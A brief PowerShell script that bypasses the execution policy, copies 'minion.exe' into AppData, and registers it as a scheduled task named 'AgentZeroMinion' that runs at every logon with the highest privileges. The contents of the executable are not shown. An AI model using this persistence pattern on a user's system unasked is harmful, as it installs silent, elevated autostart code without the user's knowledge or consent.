Set-ExecutionPolicy Bypass -Scope Process -Force
Copy-Item .\minion.exe $env:APPDATA\minion.exe -Force
$action = New-ScheduledTaskAction -Execute "$env:APPDATA\minion.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskName "AgentZeroMinion" -User "$env:USERNAME" -RunLevel Highest
Start-Process "$env:APPDATA\minion.exe"
